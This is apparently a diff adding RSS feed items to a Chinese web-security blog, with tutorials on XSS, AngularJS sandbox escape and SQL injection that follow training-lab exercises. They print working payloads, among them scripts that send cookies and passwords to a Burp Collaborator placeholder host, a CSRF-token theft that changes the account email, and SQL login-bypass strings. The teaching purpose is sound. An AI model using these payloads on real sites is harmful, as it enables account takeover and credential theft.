+      <content:encoded><![CDATA[<p>跨站脚本（也称为XSS）是一种网络安全漏洞，允许攻击者破坏用户与易受攻击应用的交互。跨站脚本通过控易受攻击的网站，使其返回恶意JavaScript给用户来实现。当恶意代码在受害者浏览器内执行时，攻击者可以完全破坏与应用的交互。</p>
+<h2 id="反射xss">反射XSS</h2>
+<p>反射跨站脚本（或称XSS）是指应用程序在HTTP请求中接收数据后，以不安全的方式将该数据包含在即时响应中。假设一个网站有一个搜索功能，能够接收用户提供的搜索词，并设置一个URL参数：</p>
+<p><code>https://insecure-website.com/search?term=gift</code></p>
+<p>该应用在对该URL的回复中呼应了所提供的搜索词：</p>
+<p><code>&lt;p&gt;You searched for: gift&lt;/p&gt;</code></p>
+<p>假设应用程序不对数据进行其他处理，攻击者可以构造如下攻击：</p>
+<p><code>https://insecure-website.com/search?term=&lt;script&gt;/*+Bad+stuff+here...+*/&lt;/script&gt;</code></p>
+<p>该网址引出以下回复：</p>
+<p><code>&lt;p&gt;You searched for: &lt;script&gt;/* Bad stuff here... */&lt;/script&gt;&lt;/p&gt;</code></p>
+<p>如果应用的其他用户请求攻击者的URL，攻击者提供的脚本将在受害者用户的浏览器中执行，且是在其与应用会话的上下文中。</p>
+<p>例如，简单地输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;alert(1)&lt;/script&gt;
+</span></span></code></pre></div><p>就可以弹出内容为“<code>1</code>”的窗口。</p>
+<h2 id="存储-xss">存储 XSS</h2>
+<p>存储的XSS（也称为持久XSS）是指应用程序从不受信任的来源接收数据，并在后续的HTTP响应中以不安全的方式包含该数据。反射型 XSS 和存储型 XSS 的关键区别在于，存储的 XSS 漏洞使攻击能够在应用内部自包含。攻击者无需寻找外部方法诱使其他用户发出包含其漏洞利用的特定请求。相反，攻击者将漏洞植入应用本身，等待用户发现。</p>
+<p>例如，在评论中输入</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;alert(1)&lt;/script&gt;
+</span></span></code></pre></div><p>每次返回评论页面都会触发弹窗。</p>
+<h2 id="利用xss漏洞">利用XSS漏洞</h2>
+<h3 id="窃取cookie">窃取cookie</h3>
+<p>例如，我们要模拟受害者用户，查看所有评论发布后的页面。要实现这个目标，需要利用漏洞窃取受害者的会话Cookie，然后用该Cookie冒充受害者。在评论框有一个基础的存储型XSS漏洞。于是，输入以下payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;script&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">fetch(&#39;https://BURP-COLLABORATOR-SUBDOMAIN&#39;, {
+</span></span><span class="line"><span class="ln">3</span><span class="cl">method: &#39;POST&#39;,
+</span></span><span class="line"><span class="ln">4</span><span class="cl">mode: &#39;no-cors&#39;,
+</span></span><span class="line"><span class="ln">5</span><span class="cl">body:document.cookie
+</span></span><span class="line"><span class="ln">6</span><span class="cl">});
+</span></span><span class="line"><span class="ln">7</span><span class="cl">&lt;/script&gt;
+</span></span></code></pre></div><p>其中的网址就是 Burp Collaborator 生成的服务器网址。这样，在这个服务器上就能得到受害者的cookie的session等。在主页面替换cookie即可。</p>
+<h3 id="捕获密码">捕获密码</h3>
+<p>漏洞于上面类似，只不过这次直接获取受害者的登录名和密码。仍然是类似的步骤，在评论区输入payload:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;input name=username id=username&gt;
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&lt;input type=password name=password onchange=&#34;if(this.value.length)fetch(&#39;https://BURP-COLLABORATOR-SUBDOMAIN&#39;,{
+</span></span><span class="line"><span class="ln">3</span><span class="cl">method:&#39;POST&#39;,
+</span></span><span class="line"><span class="ln">4</span><span class="cl">mode: &#39;no-cors&#39;,
+</span></span><span class="line"><span class="ln">5</span><span class="cl">body:username.value+&#39;:&#39;+this.value
+</span></span><span class="line"><span class="ln">6</span><span class="cl">});&#34;&gt;
+</span></span></code></pre></div><h3 id="绕过crsf">绕过CRSF</h3>
+<p>一些网站允许登录用户无需重新输入密码即可更改电子邮件地址。如果在这些网站上发现了XSS漏洞，可以利用它来窃取CSRF令牌。有了令牌，就可以将受害者的电子邮件地址更改为自己控制的邮箱。然后触发密码重置以获得账户访问权限。</p>
+<p>这种利用方式结合了XSS（窃取CSRF令牌）与CSRF通常针对的功能。传统CSRF是一种“单向”漏洞，攻击者可以诱使受害者发送请求但看不到响应，而XSS则实现了“双向”通信。这使得攻击者既能发送任意请求，也能读取响应，形成一种绕过反CSRF防御的混合攻击。</p>
+<p>比如，下面的payload就：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="o">&lt;</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="k">var</span> <span class="n">req</span> <span class="o">=</span> <span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">req</span><span class="o">.</span><span class="n">onload</span> <span class="o">=</span> <span class="n">handleResponse</span><span class="p">;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">req</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;get&#39;</span><span class="p">,</span><span class="s1">&#39;/my-account&#39;</span><span class="p">,</span><span class="bp">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">req</span><span class="o">.</span><span class="n">send</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">function</span> <span class="n">handleResponse</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="k">var</span> <span class="n">token</span> <span class="o">=</span> <span class="n">this</span><span class="o">.</span><span class="n">responseText</span><span class="o">.</span><span class="n">match</span><span class="p">(</span><span class="o">/</span><span class="n">name</span><span class="o">=</span><span class="s2">&#34;csrf&#34;</span> <span class="n">value</span><span class="o">=</span><span class="s2">&#34;(\w+)&#34;</span><span class="o">/</span><span class="p">)[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="k">var</span> <span class="n">changeReq</span> <span class="o">=</span> <span class="n">new</span> <span class="n">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="n">changeReq</span><span class="o">.</span><span class="n">open</span><span class="p">(</span><span class="s1">&#39;post&#39;</span><span class="p">,</span> <span class="s1">&#39;/my-account/change-email&#39;</span><span class="p">,</span> <span class="bp">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl">    <span class="n">changeReq</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s1">&#39;csrf=&#39;</span><span class="o">+</span><span class="n">token</span><span class="o">+</span><span class="s1">&#39;&amp;email=test@test.com&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="p">};</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="o">&lt;/</span><span class="n">script</span><span class="o">&gt;</span>
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>基于DOM的XSS</title>
+      <link>https://all-on.github.io/posts/web/xss/%E5%9F%BA%E4%BA%8Edom%E7%9A%84xss/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/xss/%E5%9F%BA%E4%BA%8Edom%E7%9A%84xss/</guid>
+      <description>&lt;p&gt;基于DOM的XSS漏洞通常出现在JavaScript从攻击者可控的来源（如URL）获取数据，并将其传递到支持动态代码执行的汇入处时，如&lt;code&gt;eval()&lt;/code&gt;或&lt;code&gt;innerHTML&lt;/code&gt;。这使得攻击者能够执行恶意JavaScript，通常可以劫持其他用户的账户。一些可能导致 DOM-XSS 漏洞的主要来源：&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<p>基于DOM的XSS漏洞通常出现在JavaScript从攻击者可控的来源（如URL）获取数据，并将其传递到支持动态代码执行的汇入处时，如<code>eval()</code>或<code>innerHTML</code>。这使得攻击者能够执行恶意JavaScript，通常可以劫持其他用户的账户。一些可能导致 DOM-XSS 漏洞的主要来源：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">document.write()
+</span></span><span class="line"><span class="ln">2</span><span class="cl">document.writeln()
+</span></span><span class="line"><span class="ln">3</span><span class="cl">document.domain
+</span></span><span class="line"><span class="ln">4</span><span class="cl">element.innerHTML
+</span></span><span class="line"><span class="ln">5</span><span class="cl">element.outerHTML
+</span></span><span class="line"><span class="ln">6</span><span class="cl">element.insertAdjacentHTML
+</span></span><span class="line"><span class="ln">7</span><span class="cl">element.onevent
+</span></span></code></pre></div><p>以下 jQuery 函数也是可能导致 DOM-XSS 漏洞的入口点：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="n">add</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="n">after</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="n">append</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="n">animate</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="n">insertAfter</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="n">insertBefore</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="n">before</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="n">html</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="n">prepend</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="n">replaceAll</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="n">replaceWith</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="n">wrap</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="n">wrapInner</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="n">wrapAll</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="n">has</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl"><span class="n">constructor</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl"><span class="n">init</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl"><span class="n">index</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl"><span class="n">jQuery</span><span class="o">.</span><span class="n">parseHTML</span><span class="p">()</span>
+</span></span><span class="line"><span class="ln">20</span><span class="cl"><span class="o">$.</span><span class="n">parseHTML</span><span class="p">()</span>
+</span></span></code></pre></div><h2 id="在-documentwrite-接收器中使用-locationsearch源的-dom-xss">在 <code>document.write</code> 接收器中使用 <code>location.search</code>源的 DOM XSS</h2>
+<p><code>location.search</code>是获取当前 URL 中问号后面的查询参数部分。<code>document.write()</code>是JavaScript 中用于动态向网页中写入内容的函数，它可以将文本或 HTML 直接插入到网页的文档中。再介绍2个<code>img</code>标签常用的函数：</p>
+<ul>
+<li><code>&lt;img src=xxx οnerrοr=&quot; &quot;&gt;</code>：当src=&ldquo;xxx&rdquo; 是不存在或无法加载的资源时，浏览器会触发 onerror 事件，可以利用图片加载失败触发 JavaScript 执行</li>
+<li><code>&lt;img src=xxx οnlοad=&quot; &quot;&gt;</code>：当src=&ldquo;xxx&rdquo; 是有效且能正常加载的资源时，浏览器会触发 onload 事件，可以利用图片加载成功触发 JavaScript 执行</li>
+</ul>
+<p>例如，搜索的参数<code>xxx</code>被这样嵌入：
+<code>&lt;img src=&quot;/resources?SearchTerms=xxx&quot;&gt;</code>
+那么，可以选择直接跳出标签：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="s2">&#34;&gt;&lt;svg onload=alert(1)&gt;</span>
+</span></span></code></pre></div><h2 id="包含于select元素中注入的-dom-xss">包含于<code>select</code>元素中注入的 DOM XSS</h2>
+<p>在某些情况下，所写内容包含一些需要在漏洞利用时考虑的相关上下文。例如，会使用<code>StoreID</code>向 URL 添加查询参数并输入随机字母数字字符串作为其值，该字符串现在被列为下拉列表中的选项之一。可以确认<code>storeId</code>参数值已放置在选择元素中：<code>&lt;select&gt;...&lt;option selected=&gt;aaa&lt;/option&gt;</code>。因此，可以构造 URL 进行XSS：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&amp;storeId=&#34;&gt;&lt;/select&gt;&lt;img%20src=1%20onerror=alert(1)&gt;
+</span></span></code></pre></div><h3 id="在-innerhtml-接收器中使用-locationsearch源的-dom-xss">在 <code>innerHTML</code> 接收器中使用 <code>location.search</code>源的 DOM XSS</h3>
+<p><code>innerHTML</code>用于读取或设置元素的 HTML 内容。<code>innerHTML sink</code>不接受任何现代浏览器中的<code>script</code>元素，<code>svg onload</code>事件也不会触发。这意味着需要使用诸如<code>img</code>或<code>iframe</code>这样的替代元素。事件处理程序如<code>onload</code>和<code>onerror</code>可以与这些元素结合使用。例如：</p>
+<p><code>element.innerHTML='... &lt;img src=1 onerror=alert(document.domain)&gt; ...'</code></p>
+<p>于是可以这样构造一个简单的payload：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;img src=1 onerror=alert(1)&gt;
+</span></span></code></pre></div><h2 id="jquery-锚点的-href-属性">jQuery 锚点的 <code>href</code> 属性</h2>
+<p>使用 URL 查询参数（location.search）作为输入，jQuery 把它设置到锚点（<code>&lt;a&gt;</code>标签）的 href 属性上，导致 DOM 型 XSS 漏洞。
+如果正在使用诸如 jQuery 这样的 JavaScript 库，需要注意可能改变页面上 DOM 元素的点。例如，jQuery 的 <code>attr()</code> 函数可以修改 DOM 元素的属性。如果数据是从用户可控的来源（例如 URL）读取的，然后传递给 <code>attr()</code> 函数，那么可能会操作传入的值以引发 XSS。例如，下面的 JavaScript 代码使用来自 URL 的数据来更改锚元素的 <code>href</code> 属性：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">$(function() {
+</span></span><span class="line"><span class="ln">2</span><span class="cl">	$(&#39;#backLink&#39;).attr(&#34;href&#34;,(new URLSearchParams(window.location.search)).get(&#39;returnUrl&#39;));
+</span></span><span class="line"><span class="ln">3</span><span class="cl">});
+</span></span></code></pre></div><p>可以通过修改 URL 来利用这一点，使 <code>location.search</code> 的来源包含一个恶意的 JavaScript URL。在页面的 JavaScript 将这个恶意 URL 应用于返回链接的 <code>href</code> 后，点击返回链接就会执行它：</p>
+<p><code>?returnUrl=javascript:alert(document.domain)</code></p>
+<h2 id="jquery的选择器函数">jQuery的选择器函数<code>$()</code></h2>
+<p>另一个需要注意的潜在漏洞是 jQuery 的 <code>$()</code> 选择器函数，它可以被用来将恶意对象注入到 DOM 中。jQuery 曾经非常流行，而一个经典的 DOM XSS 漏洞是由于网站在执行动画或自动滚动到页面特定元素时，将该选择器与 <code>location.hash</code> 源（获取当前 URL 中 <code>#</code> 后面的片段标识符，即锚点）一起使用所引起的。这种行为通常通过易受攻击的 <code>hashchange</code> 事件（当网页 URL 的 <code>#</code>（hash）部分发生变化时，这个事件会被触发）处理程序实现，类似如下所示：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">$</span><span class="p">(</span><span class="n">window</span><span class="p">)</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s1">&#39;hashchange&#39;</span><span class="p">,</span> <span class="n">function</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl">	<span class="k">var</span> <span class="n">element</span> <span class="o">=</span> <span class="o">$</span><span class="p">(</span><span class="n">location</span><span class="o">.</span><span class="n">hash</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl">	<span class="n">element</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="n">scrollIntoView</span><span class="p">();</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="p">});</span>
+</span></span></code></pre></div><p>由于哈希是用户可控的，攻击者可以利用这一点将 XSS 向量注入到 <code>$()</code> 选择器中。较新版本的jQuery通过防止输入以哈希字符（<code>#</code>）开头时向选择器注入HTML来修补这一漏洞。
+要实际利用这个经典漏洞，需要找到一种方法在没有用户交互的情况下触发 <code>hashchange</code> 事件。实现这一点最简单的方法之一是通过 <code>iframe</code> 传递漏洞利用代码：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;</span><span class="n">iframe</span> <span class="n">src</span><span class="o">=</span><span class="s2">&#34;https://vulnerable-website.com#&#34;</span> <span class="n">onload</span><span class="o">=</span><span class="s2">&#34;this.src+=&#39;&lt;img src=1 onerror=alert(1)&gt;&#39;&#34;</span><span class="o">&gt;</span>
+</span></span></code></pre></div><p>在这个例子中，<code>src</code> 属性指向具有空哈希值的易受攻击页面。当 <code>iframe</code> 加载时，XSS 向量会被附加到哈希上，从而触发 <code>hashchange</code> 事件。</p>
+<p>例如，在钓鱼页面（服务器）上发送如下的payload，将结果转变为受害者的ID就行：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;</span><span class="n">iframe</span> <span class="n">src</span><span class="o">=</span><span class="s2">&#34;https://YOUR-LAB-ID.web-security-academy.net/#&#34;</span> <span class="n">onload</span><span class="o">=</span><span class="s2">&#34;this.src+=&#39;&lt;img src=x onerror=print()&gt;&#39;&#34;</span><span class="o">&gt;&lt;/</span><span class="n">iframe</span><span class="o">&gt;</span>
+</span></span></code></pre></div><h2 id="angularjs-中的-dom-xss">AngularJS 中的 DOM XSS</h2>
+<p>如果使用像 AngularJS 这样的框架，可能可以在没有尖括号或事件的情况下执行 JavaScript。当网站在 HTML 元素上使用 <code>ng-app</code> 属性时，它将由 AngularJS 处理。在这种情况下，AngularJS 会执行直接出现在 HTML 中或属性内的双大括号里的 JavaScript。
+例如，输入：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{{</span><span class="o">$</span><span class="n">on</span><span class="o">.</span><span class="n">constructor</span><span class="p">(</span><span class="s1">&#39;alert(1)&#39;</span><span class="p">)()}}</span>
+</span></span></code></pre></div><p>在 AngularJS 的模板中，<code>{{ }}</code> 内的表达式会在当前 <code>$scope</code> 上下文中求值。<code>$on</code> 是 <code>$scope</code> 对象上的一个方法（通常用于监听事件），所以这里访问的是 <code>$scope.$on</code> 函数。每个 JavaScript 函数（实际上是所有对象）都有一个 <code>constructor</code> 属性，指向创建该对象的构造函数。<code>$on</code> 是一个函数，它的构造函数是 <strong><code>Function</code></strong>。因此 <code>$on.constructor</code> 就是全局的 <code>Function</code> 构造函数。</p>
+<h2 id="反射-dom-xss">反射 DOM XSS</h2>
+<p>在反射 DOM XSS 漏洞中，服务器处理请求数据，并将数据回响到响应中。反射数据可以被放入 JavaScript 字符串文字，或 DOM 中的数据项，如表单字段。页面上的脚本随后以不安全的方式处理反射数据，最终将其写入危险的汇入。比如：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="n">eval</span><span class="p">(</span><span class="s1">&#39;var data = &#34;reflected string&#34;&#39;</span><span class="p">);</span>
+</span></span></code></pre></div><p>例如，发现代码利用 <code>innerText</code> 将服务器返回的内容插入到页面，纯文本，所以无法执行。此外双引号还被转义<code>(\&quot;)</code>。假如输入aaa，那么响应的结果是：
+<code>{&quot;searchTerm&quot;:&quot;aaa&quot;, &quot;results&quot;:[]}</code>
+在这种情况下继续进行XSS，于是输入<code>\&quot;-alert(1)}//</code>，结果就变成了下面的响应，成功弹出了弹窗：
+<code>{&quot;searchTerm&quot;:&quot;\\&quot;-alert(1)}//&quot;, &quot;results&quot;:[]}</code>
+其中 <code>-</code> 是减号运算符，左侧是刚解析出的字符串值（一个反斜杠），右侧是 <code>alert(1)</code> 的返回值。在执行减法时，会先计算右侧 <code>alert(1)</code>，于是弹窗出现。双反斜杠 <code>//</code> 作为注释符号，将后面的内容全部注释掉。</p>
+<h2 id="存储-dom-xss">存储 DOM XSS</h2>
+<p>网站也可能将数据存储在服务器上，并将其反映在其他地方。在存储的DOM XSS漏洞中，服务器接收一个请求的数据，将其存储，然后在后续响应中包含该数据。后期响应中的脚本包含一个汇入，然后以不安全的方式处理数据。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">element.innerHTML = comment.author
+</span></span></code></pre></div><p>例如，网站使用 JavaScript的<code>replace()</code>函数对尖括号进行编码。当第一个参数是字符串时，该函数仅替换第一次出现。于是，先让开头简单地包含一组额外的尖括号来利用此漏洞。这些尖括号将被编码，但任何后续尖括号将不受影响：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&lt;&gt;&lt;img src=1 onerror=alert(1)&gt;
+</span></span></code></pre></div>]]></content:encoded>
+    </item>
+    <item>
+      <title>客户端模板注入（AngularJS沙盒）</title>
+      <link>https://all-on.github.io/posts/web/xss/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5angularjs%E6%B2%99%E7%9B%92/</link>
+      <pubDate>Thu, 19 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/xss/%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5angularjs%E6%B2%99%E7%9B%92/</guid>
+      <description>&lt;p&gt;AngularJS 沙箱是一种机制，用于防止在 AngularJS 模板表达式中访问潜在危险的对象，例如 window 或 document。它同样防止访问潜在危险的属性，例如 &lt;strong&gt;&lt;code&gt;__proto__&lt;/code&gt;&lt;/strong&gt;。它最终在 AngularJS 的 1.6 版本中被移除。&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<p>AngularJS 沙箱是一种机制，用于防止在 AngularJS 模板表达式中访问潜在危险的对象，例如 window 或 document。它同样防止访问潜在危险的属性，例如 <strong><code>__proto__</code></strong>。它最终在 AngularJS 的 1.6 版本中被移除。</p>
+<h3 id="angularjs沙盒无字符串转义">AngularJS沙盒无字符串转义</h3>
+<p>新版的AngularJS沙盒禁止访问 <code>constructor</code> 和其它危险属性，阻止字符串字面量动态构造代码（比如 <code>alert(1)</code>）。于是，我们的payload成了这样：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="ln">1</span><span class="cl"><span class="err">?</span><span class="n">search</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="n">toString</span><span class="p">()</span><span class="o">.</span><span class="n">constructor</span><span class="o">.</span><span class="n">prototype</span><span class="o">.</span><span class="n">charAt</span><span class="o">%</span><span class="mi">3</span><span class="n">d</span><span class="p">[]</span><span class="o">.</span><span class="n">join</span><span class="p">;[</span><span class="mi">1</span><span class="p">]</span><span class="o">|</span><span class="n">orderBy</span><span class="p">:</span><span class="n">toString</span><span class="p">()</span><span class="o">.</span><span class="n">constructor</span><span class="o">.</span><span class="n">fromCharCode</span><span class="p">(</span><span class="mi">120</span><span class="p">,</span><span class="mi">61</span><span class="p">,</span><span class="mi">97</span><span class="p">,</span><span class="mi">108</span><span class="p">,</span><span class="mi">101</span><span class="p">,</span><span class="mi">114</span><span class="p">,</span><span class="mi">116</span><span class="p">,</span><span class="mi">40</span><span class="p">,</span><span class="mi">49</span><span class="p">,</span><span class="mi">41</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span>
+</span></span></code></pre></div><p>这个是利用了AngularJS表达式解析器的实现细节。具体为：</p>
+<ul>
+<li><code>toString().constructor.prototype.charAt=[].join;</code>：这行将<code>String.prototype.charAt</code>替换为<code>Array.prototype.join</code>，改变了解析器的预期行为。</li>
+<li><code>toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)</code> ：这里<code>toString().constructor</code>返回<code>String</code>构造函数，调用其静态方法<code>fromCharCode</code>生成字符串<code>&quot;x=alert(1)&quot;</code>。这个字符串看似是一个赋值表达式，实际会被当作AngularJS表达式解析。</li>
+<li><code>[1]|orderBy:&quot;x=alert(1)&quot;=1</code>：用 <code>orderBy</code> 过滤器对 <code>[1]</code>数组排序。排序依据是字符串 &ldquo;x=alert(1)&quot;，再用 =1 做判断。其实这段代码的目的是在 AngularJS 解析表达式时，利用 <code>fromCharCode</code> 动态生成字符串 <code>&quot;x=alert(1)&quot;</code>，执行了 <code>alert(1)</code>。</li>
+</ul>
+]]></content:encoded>
+    </item>
+    <item>
+      <title>初步SQL</title>
+      <link>https://all-on.github.io/posts/web/sql/%E5%88%9D%E6%AD%A5sql/</link>
+      <pubDate>Thu, 12 Mar 2026 00:00:00 +0000</pubDate>
+      <guid>https://all-on.github.io/posts/web/sql/%E5%88%9D%E6%AD%A5sql/</guid>
+      <description>&lt;h2 id=&#34;检索隐藏数据&#34;&gt;检索隐藏数据&lt;/h2&gt;
+&lt;p&gt;一个购物应用展示不同类别的产品。当用户点击**“礼物**”类别时，浏览器会请求以下链接：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;https://insecure-website.com/products?category=Gifts&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这会导致应用程序进行SQL查询，从数据库中检索相关产品的详细信息：&lt;/p&gt;</description>
+      <content:encoded><![CDATA[<h2 id="检索隐藏数据">检索隐藏数据</h2>
+<p>一个购物应用展示不同类别的产品。当用户点击**“礼物**”类别时，浏览器会请求以下链接：</p>
+<p><code>https://insecure-website.com/products?category=Gifts</code></p>
+<p>这会导致应用程序进行SQL查询，从数据库中检索相关产品的详细信息：</p>
+<p><code>SELECT * FROM products WHERE category = 'Gifts' AND released = 1</code></p>
+<p>如果要让应用程序显示任何类别的所有产品，包括他们不知道的类别：</p>
+<p><code>https://insecure-website.com/products?category=Gifts'+OR+1=1--</code></p>
+<p>这会得到以下SQL查询：</p>
+<p><code>SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1</code></p>
+<h2 id="允许登录绕过">允许登录绕过</h2>
+<p>应用程序，允许用户用用户名和密码登录。如果用户提交用户名<code>wiener</code>和密码<code>bluecheese</code>，应用程序通过执行以下SQL查询来检查凭证：</p>
+<p><code>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'</code></p>
+<p>如果查询返回了用户的详细信息，则登录成功。否则，它将被拒绝。
+在这种情况下，攻击者可以以任何用户身份登录，无需密码。他们可以通过SQL注释序列来移除查询从句中的密码检查。例如，提交用户名和空密码会得到以下查询：</p>
+<p><code>SELECT * FROM users WHERE username = 'administrator'--' AND password = ''</code></p>
+<p>该查询返回了该用户，并成功将攻击者登录为该用户。</p>
+<h2 id="检查数据库">检查数据库</h2>
+<h3 id="查询oracle数据库类型和版本">查询Oracle数据库类型和版本</h3>
+<p>先使用<code>order by</code>判断列数，发现是2列。于是，使用<code>union</code>确定查询返回的列数以及哪些列包含文本：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39;union select &#39;a&#39;,&#39;a&#39; from dual--
+</span></span></code></pre></div><p>dual是Oracle数据库中的一个虚拟表（或称伪表），它只有一行一列，用于执行没有真实表可用的 <code>SELECT</code>语句或计算表达式。Oracle必须跟一个表名，如<code>select * from dual</code>
+可以判断查询返回了包含文本的两列。所以用以下查询得到Oracle数据库版本信息：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39;+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+</span></span></code></pre></div><h3 id="查询mysql数据库类型和版本">查询MySQL数据库类型和版本</h3>
+<p>需上面类似，注意查询的不同即可：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">&#39; order by 2
+</span></span><span class="line"><span class="ln">2</span><span class="cl">&#39; union select &#39;a&#39;,&#39;a&#39;-- 
